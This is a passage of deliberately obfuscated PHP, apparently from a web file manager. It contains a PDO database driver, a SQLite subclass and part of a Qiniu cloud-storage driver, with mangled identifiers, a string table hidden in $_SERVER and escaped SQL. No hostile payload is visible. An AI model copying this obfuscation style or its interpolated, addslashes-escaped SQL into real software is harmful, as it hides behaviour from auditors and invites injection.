(!$this->linkID[$Òµº§•]) { think_exception($îÏÂÅ«[1005]); } try { $this->linkID[$Òµº§•]->exec($îÏÂÅ«[1006] . think_config($îÏÂÅ«[972])); } catch (Exception $àô¾ÃØÜ) { } $this->connected = !0; if (1 != think_config($îÏÂÅ«[22])) { unset($this->config); } } return $this->linkID[$Òµº§•]; } public function free() { $this->PDOStatement = null; } public function query($´˜É½Îº, $Ù¢ñÒ€Ã = array()) { $·£ôÅÀÎ =& $_SERVER[ÕŸ²ó÷å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $´˜É½Îº; if (!empty($Ù¢ñÒ€Ã)) { $this->queryStr .= $·£ôÅÀÎ[1007] . print_r($Ù¢ñÒ€Ã, !0) . $·£ôÅÀÎ[1008]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($·£ôÅÀÎ[23], 1); think_status($·£ôÅÀÎ[24]); $this->PDOStatement = $this->_linkID->prepare($´˜É½Îº); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $§Ü¼…À³ = $this->PDOStatement->execute($Ù¢ñÒ€Ã); $this->debug(); if (!1 === $§Ü¼…À³) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($»ÏÔÈ‘ã, $Ê²óõ÷ë = array()) { $Ü³óßØ© =& $_SERVER[ÕŸ²ó÷å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $»ÏÔÈ‘ã; if (!empty($Ê²óõ÷ë)) { $this->queryStr .= $Ü³óßØ©[1007] . print_r($Ê²óõ÷ë, !0) . $Ü³óßØ©[1008]; } $äş¨çµÇ = !1; if ($this->dbType == $Ü³óßØ©[1001]) { if (preg_match($Ü³óßØ©[1009], $this->queryStr, $ÆÁœ™òĞ)) { $this->table = think_config($Ü³óßØ©[1010]) . str_ireplace(think_config($Ü³óßØ©[1011]), $Ü³óßØ©[463], $ÆÁœ™òĞ[2]); $äş¨çµÇ = (bool) $this->query($Ü³óßØ©[1012] . strtoupper($this->table) . $Ü³óßØ©[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ü³óßØ©[25], 1); think_status($Ü³óßØ©[24]); $this->PDOStatement = $this->_linkID->prepare($»ÏÔÈ‘ã); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÍõƒøÜÖ = $this->PDOStatement->execute($Ê²óõ÷ë); $this->debug(); if (!1 === $ÍõƒøÜÖ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($äş¨çµÇ || preg_match($Ü³óßØ©[1013], $»ÏÔÈ‘ã)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‡¢éÏğÇ = $this->_linkID->commit(); $this->transTimes = 0; if (!$‡¢éÏğÇ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $‚’ğÏà£ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$‚’ğÏà£) { $this->error(); return !1; } } return !0; } private function getAll() { $¯ÃÊÒ¼€ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¯ÃÊÒ¼€); return $¯ÃÊÒ¼€; } public function getFields($§íİÎÕ¨) { $¾§ğª“Æ =& $_SERVER[ÕŸ²ó÷å]; $this->initConnect(!0); if (think_config($¾§ğª“Æ[1014])) { $òØŒ˜î = str_replace($¾§ğª“Æ[1015], $§íİÎÕ¨, think_config($¾§ğª“Æ[1014])); } else { switch ($this->dbType) { case $¾§ğª“Æ[998]: case $¾§ğª“Æ[1016]: $òØŒ˜î = "\x53\x45\x4c\x45\x43\124\40\x20\40\x63\157\x6c\x75\x6d\x6e\137\156\141\155\x65\40\141\x73\x20\x27\116\x61\155\145\47\54\x20\x20\x20\x64\x61\x74\x61\x5f\164\171\160\145\40\141\x73\x20\47\x54\171\160\145\47\54\x20\x20\40\x63\157\154\165\155\x6e\x5f\x64\145\x66\141\165\x6c\x74\40\x61\163\40\47\x44\145\x66\x61\x75\154\164\x27\54\x20\40\x20\x69\163\x5f\156\x75\154\x6c\141\142\154\x65\40\x61\163\x20\x27\x4e\x75\x6c\154\x27\xa\11\x9\x46\x52\117\115\11\x69\156\146\x6f\162\155\141\x74\151\157\x6e\x5f\163\x63\x68\145\x6d\141\56\164\x61\x62\x6c\145\163\x20\x41\x53\x20\x74\12\x9\x9\112\117\x49\116\11\151\x6e\146\x6f\x72\155\141\164\x69\157\x6e\x5f\x73\x63\x68\145\155\141\56\143\157\154\165\x6d\156\x73\40\101\123\40\x63\12\11\11\x4f\x4e\40\x20\164\x2e\x74\141\x62\x6c\x65\x5f\143\x61\164\141\154\157\x67\40\x3d\x20\x63\56\x74\x61\x62\154\x65\137\x63\x61\164\x61\x6c\x6f\x67\xa\11\x9\x41\x4e\104\40\x74\56\164\x61\x62\154\145\x5f\163\x63\x68\145\155\141\40\75\x20\x63\x2e\164\141\142\x6c\145\x5f\x73\143\x68\x65\155\141\12\x9\11\101\116\104\40\x74\x2e\164\x61\142\154\x65\137\156\141\x6d\145\x20\x3d\40\x63\x2e\164\x61\142\x6c\145\x5f\156\141\x6d\145\12\11\x9\127\110\x45\x52\105\40\40\40\164\56\x74\141\142\154\x65\x5f\156\141\x6d\145\x20\x3d\x20\47{$§íİÎÕ¨}\47"; break; case $¾§ğª“Æ[1017]: $òØŒ˜î = $¾§ğª“Æ[1018] . $§íİÎÕ¨ . $¾§ğª“Æ[1019]; break; case $¾§ğª“Æ[999]: case $¾§ğª“Æ[1001]: $òØŒ˜î = $¾§ğª“Æ[1020] . $¾§ğª“Æ[1021] . $¾§ğª“Æ[1022] . strtoupper($§íİÎÕ¨) . $¾§ğª“Æ[1023] . strtoupper($§íİÎÕ¨) . $¾§ğª“Æ[1024]; break; case $¾§ğª“Æ[1025]: $òØŒ˜î = $¾§ğª“Æ[1026] . $§íİÎÕ¨ . $¾§ğª“Æ[1027]; break; case $¾§ğª“Æ[1000]: break; case $¾§ğª“Æ[1028]: default: $òØŒ˜î = $¾§ğª“Æ[1029] . ($this->dbType == $¾§ğª“Æ[1028] ? "\140{$§íİÎÕ¨}\x60" : $§íİÎÕ¨); } } $”Ë·Î°¼ = $this->query($òØŒ˜î); $ÉÁÌû­µ = array(); if ($”Ë·Î°¼) { foreach ($”Ë·Î°¼ as $Ÿ¢Ô§² => $ƒÆ•ø˜£) { $ƒÆ•ø˜£ = array_change_key_case($ƒÆ•ø˜£); $ƒÆ•ø˜£[$¾§ğª“Æ[32]] = isset($ƒÆ•ø˜£[$¾§ğª“Æ[32]]) ? $ƒÆ•ø˜£[$¾§ğª“Æ[32]] : $¾§ğª“Æ[463]; $ƒÆ•ø˜£[$¾§ğª“Æ[33]] = isset($ƒÆ•ø˜£[$¾§ğª“Æ[33]]) ? $ƒÆ•ø˜£[$¾§ğª“Æ[33]] : $¾§ğª“Æ[463]; $ê¯ƒ†ü = isset($ƒÆ•ø˜£[$¾§ğª“Æ[359]]) ? $ƒÆ•ø˜£[$¾§ğª“Æ[359]] : $ƒÆ•ø˜£[$¾§ğª“Æ[32]]; $ÉÁÌû­µ[$ê¯ƒ†ü] = array($¾§ğª“Æ[32] => $ê¯ƒ†ü, $¾§ğª“Æ[33] => $ƒÆ•ø˜£[$¾§ğª“Æ[33]], $¾§ğª“Æ[35] => (bool) (isset($ƒÆ•ø˜£[$¾§ğª“Æ[116]]) && $ƒÆ•ø˜£[$¾§ğª“Æ[116]] === $¾§ğª“Æ[12] || isset($ƒÆ•ø˜£[$¾§ğª“Æ[35]]) && $ƒÆ•ø˜£[$¾§ğª“Æ[35]] === $¾§ğª“Æ[12]), $¾§ğª“Æ[37] => isset($ƒÆ•ø˜£[$¾§ğª“Æ[37]]) ? $ƒÆ•ø˜£[$¾§ğª“Æ[37]] : (isset($ƒÆ•ø˜£[$¾§ğª“Æ[66]]) ? $ƒÆ•ø˜£[$¾§ğª“Æ[66]] : $¾§ğª“Æ[463]), $¾§ğª“Æ[39] => isset($ƒÆ•ø˜£[$¾§ğª“Æ[107]]) ? strtolower($ƒÆ•ø˜£[$¾§ğª“Æ[107]]) == $¾§ğª“Æ[41] : (isset($ƒÆ•ø˜£[$¾§ğª“Æ[67]]) ? $ƒÆ•ø˜£[$¾§ğª“Æ[67]] : !1), $¾§ğª“Æ[42] => isset($ƒÆ•ø˜£[$¾§ğª“Æ[1030]]) ? strtolower($ƒÆ•ø˜£[$¾§ğª“Æ[1030]]) == $¾§ğª“Æ[44] : (isset($ƒÆ•ø˜£[$¾§ğª“Æ[107]]) ? $ƒÆ•ø˜£[$¾§ğª“Æ[107]] : !1)); } } return $ÉÁÌû­µ; } public function getTables($ª•«öÈ¤ = '') { $¨ÕüœÂ¡ =& $_SERVER[ÕŸ²ó÷å]; if (think_config($¨ÕüœÂ¡[1031])) { $ø÷ŸÅ—µ = str_replace($¨ÕüœÂ¡[1032], $ª•«öÈ¤, think_config($¨ÕüœÂ¡[1031])); } else { switch ($this->dbType) { case $¨ÕüœÂ¡[999]: case $¨ÕüœÂ¡[1001]: $ø÷ŸÅ—µ = $¨ÕüœÂ¡[1033]; break; case $¨ÕüœÂ¡[998]: case $¨ÕüœÂ¡[1016]: $ø÷ŸÅ—µ = $¨ÕüœÂ¡[1034]; break; case $¨ÕüœÂ¡[1025]: $ø÷ŸÅ—µ = $¨ÕüœÂ¡[1035]; break; case $¨ÕüœÂ¡[1000]: think_exception(think_lang($¨ÕüœÂ¡[1036]) . $¨ÕüœÂ¡[1037]); break; case $¨ÕüœÂ¡[1017]: $ø÷ŸÅ—µ = $¨ÕüœÂ¡[45] . $¨ÕüœÂ¡[46] . $¨ÕüœÂ¡[47]; break; case $¨ÕüœÂ¡[1028]: default: if (!empty($ª•«öÈ¤)) { $ø÷ŸÅ—µ = $¨ÕüœÂ¡[980] . $ª•«öÈ¤ . $¨ÕüœÂ¡[981]; } else { $ø÷ŸÅ—µ = $¨ÕüœÂ¡[982]; } } } $¡ˆó‚ƒ = $this->query($ø÷ŸÅ—µ); $ÍûÕÛäÎ = array(); foreach ($¡ˆó‚ƒ as $…ŒõÕóë => $ÇÇº¦µ¼) { $ÍûÕÛäÎ[$…ŒõÕóë] = current($ÇÇº¦µ¼); } return $ÍûÕÛäÎ; } protected function parseLimit($• ¨¨Ó˜) { $‹›¯úÓæ =& $_SERVER[ÕŸ²ó÷å]; $³ˆ†» = $‹›¯úÓæ[12]; if (!empty($• ¨¨Ó˜)) { switch ($this->dbType) { case $‹›¯úÓæ[1025]: case $‹›¯úÓæ[1017]: $• ¨¨Ó˜ = explode($‹›¯úÓæ[50], $• ¨¨Ó˜); if (count($• ¨¨Ó˜) > 1) { $³ˆ†» .= $‹›¯úÓæ[51] . $• ¨¨Ó˜[1] . $‹›¯úÓæ[52] . $• ¨¨Ó˜[0] . $‹›¯úÓæ[53]; } else { $³ˆ†» .= $‹›¯úÓæ[51] . $• ¨¨Ó˜[0] . $‹›¯úÓæ[53]; } break; case $‹›¯úÓæ[998]: case $‹›¯úÓæ[1016]: break; case $‹›¯úÓæ[1000]: break; case $‹›¯úÓæ[999]: case $‹›¯úÓæ[1001]: break; case $‹›¯úÓæ[1028]: default: $³ˆ†» .= $‹›¯úÓæ[51] . $• ¨¨Ó˜ . $‹›¯úÓæ[53]; } } return $³ˆ†»; } public function parseKey(&$°–”’è³, $ƒª¿®×Ù = true) { $‹ª¹Û‡ê =& $_SERVER[ÕŸ²ó÷å]; if ($ƒª¿®×Ù) { $°–”’è³ = $this->parseKeyCheck($°–”’è³); } if ($this->dbType == $‹ª¹Û‡ê[1028]) { if ($°–”’è³ != $‹ª¹Û‡ê[230] && !preg_match($‹ª¹Û‡ê[992], $°–”’è³)) { $°–”’è³ = $‹ª¹Û‡ê[470] . trim($°–”’è³, $‹ª¹Û‡ê[470]) . $‹ª¹Û‡ê[470]; } return $°–”’è³; } else { return parent::parseKey($°–”’è³, $ƒª¿®×Ù); } } public function close() { $this->_linkID = null; } public function error() { $¼›–á˜ =& $_SERVER[ÕŸ²ó÷å]; if ($this->PDOStatement) { $ßƒÙÁâı = $this->PDOStatement->errorInfo(); $this->error = $ßƒÙÁâı[1] . $¼›–á˜[4] . $ßƒÙÁâı[2]; } else { $this->error = $¼›–á˜[12]; } if ($¼›–á˜[12] != $this->queryStr) { $this->error .= LNG($¼›–á˜[48]) . $this->queryStr; } think_trace($this->error, $¼›–á˜[12], $¼›–á˜[49]); return $this->error; } public function escapeString($€Âœş®ë) { $á­«ë—Ì =& $_SERVER[ÕŸ²ó÷å]; switch ($this->dbType) { case $á­«ë—Ì[1025]: case $á­«ë—Ì[998]: case $á­«ë—Ì[1016]: case $á­«ë—Ì[1028]: return addslashes($€Âœş®ë); case $á­«ë—Ì[1000]: case $á­«ë—Ì[1017]: case $á­«ë—Ì[999]: case $á­«ë—Ì[1001]: return str_ireplace($á­«ë—Ì[68], $á­«ë—Ì[69], $€Âœş®ë); } } protected function parseValue($±ş”İŒŞ) { $Ø¸äÙ­’ =& $_SERVER[ÕŸ²ó÷å]; if (is_string($±ş”İŒŞ)) { $ş×ÃÊ§ı = strpos($±ş”İŒŞ, $Ø¸äÙ­’[4]) === 0 && in_array($±ş”İŒŞ, array_keys($this->bind)); $±ş”İŒŞ = $ş×ÃÊ§ı ? $this->escapeString($±ş”İŒŞ) : $Ø¸äÙ­’[1038] . $this->escapeString($±ş”İŒŞ) . $Ø¸äÙ­’[1038]; } elseif (isset($±ş”İŒŞ[0]) && is_string($±ş”İŒŞ[0]) && strtolower($±ş”İŒŞ[0]) == $Ø¸äÙ­’[382]) { $±ş”İŒŞ = $this->escapeString($±ş”İŒŞ[1]); } elseif (is_array($±ş”İŒŞ)) { $±ş”İŒŞ = array_map(array($this, $Ø¸äÙ­’[1039]), $±ş”İŒŞ); } elseif (is_bool($±ş”İŒŞ)) { $±ş”İŒŞ = $±ş”İŒŞ ? $Ø¸äÙ­’[101] : $Ø¸äÙ­’[238]; } elseif (is_null($±ş”İŒŞ)) { $±ş”İŒŞ = $Ø¸äÙ­’[116]; } return $±ş”İŒŞ; } public function getLastInsertId() { $œ·–Ïªî =& $_SERVER[ÕŸ²ó÷å]; switch ($this->dbType) { case $œ·–Ïªî[1025]: case $œ·–Ïªî[1017]: case $œ·–Ïªî[998]: case $œ·–Ïªî[1016]: case $œ·–Ïªî[1000]: case $œ·–Ïªî[1028]: return $this->_linkID->lastInsertId(); case $œ·–Ïªî[999]: case $œ·–Ïªî[1001]: $Ôîş£ = $this->table; $‹Ûğï¾‡ = $this->query("\123\105\x4c\x45\x43\x54\x20{$Ôîş£}\56\x63\x75\x72\x72\x76\141\154\x20\x63\165\162\x72\166\x61\154\40\x46\122\x4f\x4d\x20\144\x75\x61\154"); return $‹Ûğï¾‡ ? $‹Ûğï¾‡[0][$œ·–Ïªî[1040]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ˆ’àÊİ¯) { $¼ºÕ†Çñ =& $_SERVER[ÕŸ²ó÷å]; if (!CacheLock::fileLock($¼ºÕ†Çñ[13])) { return !1; } $·õ¼ÁÎ‚ = parent::query($ˆ’àÊİ¯); CacheLock::fileUnLock($¼ºÕ†Çñ[13]); return $·õ¼ÁÎ‚; } public function execute($¯áš¦òµ) { $Šş¼™Ğ£ =& $_SERVER[ÕŸ²ó÷å]; if (!CacheLock::fileLock($Šş¼™Ğ£[13])) { return !1; } $¹†ôÕÎ = parent::execute($¯áš¦òµ); CacheLock::fileUnLock($Šş¼™Ğ£[13]); return $¹†ôÕÎ; } } goto CÅ”ƒ‚…ö; dåĞ‘½Ú¿£: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Ô¢¼©³÷) { parent::__construct(); require_once SDK_DIR . $_SERVER[ÕŸ²ó÷å][1529]; $this->_init($Ô¢¼©³÷); } public function _init($‡¢¬Ä±—) { $åÑÛËÜÙ =& $_SERVER[ÕŸ²ó÷å]; $this->config = $‡¢¬Ä±—; foreach ($‡¢¬Ä±— as $¢ãÌª„æ => $„üĞ¸©à) { if (isset($this->{$¢ãÌª„æ})) { $this->{$¢ãÌª„æ} = $„üĞ¸©à; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($åÑÛËÜÙ[1530] . LNG($åÑÛËÜÙ[1465])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($½‹ÀáÃò, $Ñ–¦À” = '', $íÅœØãğ = REPEAT_RENAME) { if ($this->setContent($½‹ÀáÃò, $Ñ–¦À”)) { return $this->getPathOuter($½‹ÀáÃò); } return !1; } public function mkdir($ôÜÎ€Ñ², $‘ìº©¯³ = REPEAT_SKIP) { $©·Í¬Ä» =& $_SERVER[ÕŸ²ó÷å]; $ÖÖ“äÈÇ = trim($ôÜÎ€Ñ², $©·Í¬Ä»[8]); if ($this->_isFolder($ÖÖ“äÈÇ)) { return $this->getPathOuter($ÖÖ“äÈÇ); } $ôÜÎ€Ñ² = $ÖÖ“äÈÇ . $©·Í¬Ä»[8]; $ÀÙÌâ¿Ã = get_path_this($ÖÖ“äÈÇ); $âÜÄ¹ƒ¾ = $ôÜÎ€Ñ² . $ÀÙÌâ¿Ã; if (!$this->mkfile($âÜÄ¹ƒ¾)) { return !1; } if (!$this->moveFile($âÜÄ¹ƒ¾, $ôÜÎ€Ñ²)) { $this->delFile($âÜÄ¹ƒ¾); return !1; } return $this->getPathOuter($ÖÖ“äÈÇ); } public function copyFile($´˜É–Ì”, $şä”¦Å¼) { $‰òÜœ = $this->bucketManager->copy($this->bucket, $´˜É–Ì”, $this->bucket, $şä”¦Å¼, !0); return $‰òÜœ ? !1 : $this->getPathOuter($şä”¦Å¼); } public function moveFile($³ûêó®›, $¯ß±î…) { $®ùöö›— = $this->bucketManager->move($this->bucket, $³ûêó®›, $this->bucket, $¯ß±î…, !0); return $®ùöö›— ? !1 : $this->getPathOuter($¯ß±î…); } public function delFile($ÓÊÁ¤®) { if (!$this->exist($ÓÊÁ¤®)) { return !0; } $£Ìıµ–é = $this->bucketManager->delete($this->bucket, $ÓÊÁ¤®); return $£Ìıµ–é ? !1 : !0; } public function delFolder($ˆêË›Öõ) { $õ»¦šƒ =& $_SERVER[ÕŸ²ó÷å]; if (!$this->exist($ˆêË›Öõ)) { return !0; } $this->listItemCache = !1; $Á¥ÔÆÒ = $this->fileList($ˆêË›Öõ); $this->listItemCache = !0; $óÌéÛçñ = trim($ˆêË›Öõ, $õ»¦šƒ[8]) . $õ»¦šƒ[8]; if (!empty($ˆêË›Öõ) && $ˆêË›Öõ !== $õ»¦šƒ[238] && !in_array($óÌéÛçñ, $Á¥ÔÆÒ[$õ»¦šƒ[95]])) { $Á¥ÔÆÒ[$õ»¦šƒ[95]][] = $óÌéÛçñ; } $ Ê¿½÷§ = $this->delByBatch($Á¥ÔÆÒ[$õ»¦šƒ[96]]); if (!$ Ê¿½÷§) { return !1; } $ Ê¿½÷§ = $this->delByBatch($Á¥ÔÆÒ[$õ»¦šƒ[95]]); if (!$ Ê¿½÷§) { return !1; } return $this->delFile($óÌéÛçñ); } private function delByBatch($ô£º³Ç³) { foreach (array_chunk($ô£º³Ç³, 1000) as $™ïİĞÙ×) { $ßÒš°’ = $this->bucketManager->buildBatchDelete($this->bucket, $™ïİĞÙ×); list($ÁÇ’şÃ‹, $ıÖÆ‹Í) = $this->bucketManager->batch($ßÒš°’); if ($ıÖÆ‹Í) { return !1; } } return !0; } public function rename($ò–Œôä», $º£™¸æÕ) { return $this->renameObject($ò–Œôä», $º£™¸æÕ); } public function fileInfo($©šÉ¬ôÍ, $ôÁ©›Ëş = false, $“æÓĞæ• = array()) { $ÆëäÍ´­ =& $_SERVER[ÕŸ²ó÷å]; $˜ì¬¶ù = array($ÆëäÍ´­[32] => $this->pathThis($©šÉ¬ôÍ), $ÆëäÍ´­[97] => $this->getPathOuter($ÆëäÍ´­[8] . $©šÉ¬ôÍ), $ÆëäÍ´­[33] => $ÆëäÍ´­[240], $ÆëäÍ´­[89] => isset($“æÓĞæ•[$ÆëäÍ´­[1531]]) ? $“æÓĞæ•[$ÆëäÍ´­[1531]] : 0, $ÆëäÍ´­[179] => $this->ext($©šÉ¬ôÍ)); if ($ôÁ©›Ëş) { return $˜ì¬¶ù; } $˜ì¬¶ù[$ÆëäÍ´­[241]] = $˜ì¬¶ù[$ÆëäÍ´­[98]] = 0; $˜ì¬¶ù[$ÆëäÍ´­[242]] = $˜ì¬¶ù[$ÆëäÍ´­[243]] = !0; if (empty($“æÓĞæ•)) { $“æÓĞæ• = $this->objectMeta($©šÉ¬ôÍ); if (!$“æÓĞæ•) { return $˜ì¬¶ù; } } if (isset($“æÓĞæ•[$ÆëäÍ´­[244]]) && $“æÓĞæ•[$ÆëäÍ´­[244]]) { $˜ì¬¶ù[$ÆëäÍ´­[245]] = $“æÓĞæ•[$ÆëäÍ´­[244]]; } if (isset($“æÓĞæ•[$ÆëäÍ´­[255]]) && $“æÓĞæ•[$ÆëäÍ´­[255]]) { $˜ì¬¶ù[$ÆëäÍ´­[245]] = $“æÓĞæ•[$ÆëäÍ´­[255]]; } if (isset($“æÓĞæ•[$ÆëäÍ´­[1532]])) { $˜ì¬¶ù[$ÆëäÍ´­[98]] = substr($“æÓĞæ•[$ÆëäÍ´­[1532]] . $ÆëäÍ´­[12], 0, 10); } if (isset($“æÓĞæ•[$ÆëäÍ´­[1531]])) { $˜ì¬¶ù[$ÆëäÍ´­[89]] = $“æÓĞæ•[$ÆëäÍ´­[1531]]; } return $˜ì¬¶ù; } public function folderInfo($ƒ½çñÂš, $Æƒ“¹Ö = false) { $‡Ü ù¯¾ =& $_SERVER[ÕŸ²ó÷å]; $ãåÔÄ½Á = array($‡Ü ù¯¾[32] => $this->pathThis($ƒ½çñÂš), $‡Ü ù¯¾[97] => $this->getPathOuter($‡Ü ù¯¾[8] . $ƒ½çñÂš), $‡Ü ù¯¾[33] => $‡Ü ù¯¾[88]); if ($Æƒ“¹Ö) { return $ãåÔÄ½Á; } $ãåÔÄ½Á[$‡Ü ù¯¾[241]] = $ãåÔÄ½Á[$‡Ü ù¯¾[98]] = 0; $ãåÔÄ½Á[$‡Ü ù¯¾[242]] = $ãåÔÄ½Á[$‡Ü ù¯¾[243]] = !0; $ƒ½çñÂš = rtrim($ƒ½çñÂš, $‡Ü ù¯¾[8]) . $‡Ü ù¯¾[8]; $ì±àü´ = $this->objectMeta($ƒ½çñÂš); if (isset($ì±àü´[$‡Ü ù¯¾[1532]])) { $ãåÔÄ½Á[$‡Ü ù¯¾[98]] = substr($ì±àü´[$‡Ü ù¯¾[1532]] . $‡Ü ù¯¾[12], 0, 10); } return $ãåÔÄ½Á; } public function listPath($ãî©®¡ù, $¹¦Ş‹© = false) { $ÄÆşâôÃ =& $_SERVER[ÕŸ²ó÷å]; $°¯‹—ğ² = $this->fileList($ãî©®¡ù, $ÄÆşâôÃ[8], !0); foreach ($°¯‹—ğ²[$ÄÆşâôÃ[95]] as $ÇºÖ¶ì¸ => $•ŒÆŠâ) { $°¯‹—ğ²[$ÄÆşâôÃ[95]][$ÇºÖ¶ì¸] = $this->folderInfo($•ŒÆŠâ, $¹¦Ş‹©); } foreach ($°¯‹—ğ²[$ÄÆşâôÃ[96]] as $ÇºÖ¶ì¸ => $•ŒÆŠâ) { $°¯‹—ğ²[$ÄÆşâôÃ[96]][$ÇºÖ¶ì¸] = $this->fileInfo($•ŒÆŠâ[$ÄÆşâôÃ[107]], $¹¦Ş‹©, $•ŒÆŠâ); } return $°¯‹—ğ²; } public function has($šÓ©§í², $®ŠÕÁİâ = false, $È·£Ğîö = true) { $óÊ‡øÕï =& $_SERVER[ÕŸ²ó÷å]; $šÓ©§í² = trim($šÓ©§í², $óÊ‡øÕï[8]); $Éõ­† = empty($šÓ©§í²) && $šÓ©§í² !== $óÊ‡øÕï[238] ? $óÊ‡øÕï[12] : $šÓ©§í² . $óÊ‡øÕï[8]; $·ì½ØÏØ = $óÊ‡øÕï[12]; $‚Âö©¦¼ = 500; $ø÷£…é‚ = $óÊ‡øÕï[8]; $ú¦ˆŞ–¢ = $†»§¹Ø¨ = 0; while (!0) { check_abort(); list($³×óÃµ, $÷¦µÏç) = $this->bucketManager->listFiles($this->bucket, $Éõ­†, $·ì½ØÏØ, $‚Âö©¦¼, $ø÷£…é‚); if ($÷¦µÏç) { break; } $·ì½ØÏØ = array_key_exists($óÊ‡øÕï[1477], $³×óÃµ) ? $·ì½ØÏØ = $³×óÃµ[$óÊ‡øÕï[1533]] : $óÊ‡øÕï[12]; if ($®ŠÕÁİâ) { if (!empty($³×óÃµ[$óÊ‡øÕï[1534]])) { $ú¦ˆŞ–¢ += count($³×óÃµ[$óÊ‡øÕï[1534]]); } if (!empty($³×óÃµ[$óÊ‡øÕï[1535]])) { $†»§¹Ø¨ += count($³×óÃµ[$óÊ‡øÕï[1535]]); } if ($·ì½ØÏØ === $óÊ‡øÕï[12]) { break; } continue; } if ($È·£Ğîö) { if (!empty($³×óÃµ[$óÊ‡øÕï[1534]])) { return !0; } } else { if (!empty($³×óÃµ[$óÊ‡øÕï[1535]])) { return !0; } } if ($·ì½ØÏØ === $óÊ‡øÕï[12]) { break; } } if ($®ŠÕÁİâ) { return array($óÊ‡øÕï[249] => $ú¦ˆŞ–¢, $óÊ‡øÕï[250] => $†»§¹Ø¨); } return !1; } public function listAll($¡øØÁ) { $ßõÈ‰ˆ =& $_SERVER[ÕŸ²ó÷å]; $î›”øØÇ = $this->fileList($¡øØÁ, $ßõÈ‰ˆ[12], !0); $ã®›ÜŠ¤ = array_to_keyvalue($î›”øØÇ[$ßõÈ‰ˆ[96]], $ßõÈ‰ˆ[32]); foreach ($î›”øØÇ[$ßõÈ‰ˆ[95]] as $Öğû‹‹) { if (is_string($Öğû‹‹)) { $ã®›ÜŠ¤[$Öğû‹‹] = array($ßõÈ‰ˆ[89] => 0); } } return $this->listAllFiles($¡øØÁ, $ã®›ÜŠ¤); } private function fileList($øïóÆ“®, $¾úÕƒ€ = '', $¦Õ—¥Ë† = 0) { $¡¢ßîÉÚ =& $_SERVER[ÕŸ²ó÷å]; $øïóÆ“® = trim($øïóÆ“®, $¡¢ßîÉÚ[8]); $¾ú§õ°Ø = empty($øïóÆ“®) && $øïóÆ“® !== $¡¢ßîÉÚ[238] ? $¡¢ßîÉÚ[12] : $øïóÆ“® . $¡¢ßîÉÚ[8]; $àÜàãÌ° = $¡¢ßîÉÚ[12]; $Ší€¯ş¦ = 1000; $ÃÌ·•Ö = $Á Ş° = array(); while (!0) { check_abort(); list($ö”¯¹Ìë, $¿´òçğÌ) = $this->bucketManager->listFiles($this->bucket, $¾ú§õ°Ø, $àÜàãÌ°, $Ší€¯ş¦, $¾úÕƒ€); if ($¿´òçğÌ) { break; } $àÜàãÌ° = array_key_exists($¡¢ßîÉÚ[1477], $ö”¯¹Ìë) ? $àÜàãÌ° = $ö”¯¹Ìë[$¡¢ßîÉÚ[1533]] : $¡¢ßîÉÚ[12]; $·±ÈÏø¼ = isset($ö”¯¹Ìë[$¡¢ßîÉÚ[1534]]) ? $ö”¯¹Ìë[$¡¢ßîÉÚ[1534]] : array(); $Ï¶Ç‚–Ú = isset($ö”¯¹Ìë[$¡¢ßîÉÚ[1535]]) ? $ö”¯¹Ìë[$¡¢ßîÉÚ[1535]] : array(); foreach ($·±ÈÏø¼ as $ø‘À†Ê) { if ($ø‘À†Ê[$¡¢ßîÉÚ[107]] == $¾ú§õ°Ø) { continue; } $Œİ¹Ö»­ = $ø‘À†Ê[$¡¢ßîÉÚ[107]]; $Áï¤ÛÆÔ = $ø‘À†Ê[$¡¢ßîÉÚ[1531]]; $ø‘À†Ê[$¡¢ßîÉÚ[89]] = $Áï¤ÛÆÔ; $Ó»…Öã = $Áï¤ÛÆÔ == 0 && substr($Œİ¹Ö»­, strlen($Œİ¹Ö»­) - 1, 1) == $¡¢ßîÉÚ[8] ? !0 : !1; $this->cacheMethodInfoSet($Œİ¹Ö»­, $Ó»…Öã, $ø‘À†Ê); if ($Ó»…Öã) { $ÃÌ·•Ö[] = $Œİ¹Ö»­; continue; } $Á Ş°[] = $¦Õ—¥Ë† ? $ø‘À†Ê : $Œİ¹Ö»­; } foreach ($Ï¶Ç‚–Ú as $Œİ¹Ö»­) { if ($Œİ¹Ö»­ == $¾ú§õ°Ø) { continue; } $ÃÌ·•Ö[] = $Œİ¹Ö»­; $this->cacheMethodInfoSet($Œİ¹Ö»­, !0); } if ($àÜàãÌ° === $¡¢ßîÉÚ[12]) { break; } } $this->cacheMethodInfoSet($øïóÆ“®, !0); return array($¡¢ßîÉÚ[95] => $ÃÌ·•Ö, $¡¢ßîÉÚ[96] => $Á Ş°); } public function canRead($İÃ±ä×ä) { return $this->exist($İÃ±ä×ä) ? !0 : !1; } public function canWrite($–¿Ÿïµ¡) { return $this->exist($–¿Ÿïµ¡) ? !0 : !1; } public function getContent($¹ŸÒ÷İ¬) { return $this->fileSubstr($¹ŸÒ÷İ¬, 0, -1); } public function setContent($šÒ°È , $Ö‰¡²§º = '') { $®ßıúÄË = 